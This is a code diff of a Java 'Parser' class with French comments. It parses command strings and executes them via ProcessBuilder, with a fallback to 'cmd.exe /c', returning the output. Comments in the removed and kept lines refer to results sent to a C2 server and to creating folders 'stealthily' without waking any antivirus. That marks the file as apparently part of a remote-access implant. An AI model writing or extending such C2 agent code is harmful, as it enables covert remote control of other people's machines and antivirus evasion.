@@ -9,22 +9,8 @@ import java.util.regex.Pattern;
 
 public class Parser {
     public static java.io.File currentFile = new java.io.File(System.getProperty("user.dir"));
-  //  public static void main(String[] arg) throws IOException {
-//
-  //       String fausseCommande = "cd C:\\Users\\basti\\Desktop\\";
-    //    System.out.println("On envoie au parseur : " + fausseCommande);
-//
-   //      List<String> command = commandSplit(fausseCommande);
-     //   System.out.println("Le parseur a renvoyé : " + command);
-       // String resultatC2 = executeCommand(command);
-       // executeCommand(commandSplit("mkdir test"));
 
-
-      //  System.out.println("--- CE QUI SERA ENVOYÉ AU SERVEUR ---");
-      //  System.out.println(resultatC2);
-   // }
-
-    private static List<String> commandSplit(String message){
+    public static List<String> commandSplit(String message){
         List<String> result = new ArrayList<>(); //making a list
         Pattern motif = Pattern.compile("(\"[^\"]+\"|\\S+)");
         Matcher chercheur = motif.matcher(message);
@@ -39,48 +25,36 @@ public class Parser {
         }
         return result;
     }
+    private static String lireFlux(Process execute) throws IOException {
+        java.io.InputStream flux = execute.getInputStream();
+        java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
+        StringBuilder responses = new StringBuilder();
+        String line;
+        while ((line = lecteur.readLine()) != null) {
+            responses.append(line).append("\n");
+        }
+        return responses.toString();
+    }
     public static String executeCommand(String commande) throws IOException {
 
         List<String> command = commandSplit(commande);
-        if (command.get(0).equals("cd")){
-            if (command.size() > 1) {
-                currentFile = new java.io.File(command.get(1));
-                return "moved into " + currentFile.getAbsolutePath() + "\n";
-            }else{
-                return "Error : cd need path" + "\n";
-            }
 
-        } else if (Objects.equals(command.get(0), "mkdir")) {
-            if (command.size() > 1) {
-                // On crée le dossier à l'intérieur de notre mémoire (currentFile)
-                java.io.File nouveauDossier = new java.io.File(currentFile, command.get(1));
-
-                // La méthode native Java qui ne réveille aucun antivirus :
-                if (nouveauDossier.mkdir()) {
-                    return "Succès : Dossier '" + command.get(1) + "' créé furtivement !\n";
-                } else {
-                    return "Erreur : Impossible de créer le dossier.\n";
-                }
-            }
-            return "Erreur : mkdir a besoin d'un nom de dossier.\n";
-        } else {
-
-
-                // TODO : execute dans un cmd stppppppppp
-
+        try {
             Process execute = new ProcessBuilder(command).directory(currentFile).start();
-            java.io.InputStream flux = execute.getInputStream();
-            java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
 
-            String line;
-            StringBuilder responses = new StringBuilder();
-            while ((line = lecteur.readLine()) != null) {
-                responses.append(line).append("\n");
+            return lireFlux(execute);
+        } catch (IOException e) {
+            if (e.getMessage().contains("error=2")) {
 
+                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
+                return lireFlux(executeFallback);
+
+            } else {
+                // Si c'est une autre erreur grave, on la renvoie au serveur
+                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
             }
-            return responses.toString();
         }
-    }
 
 
-}
+
+    }}
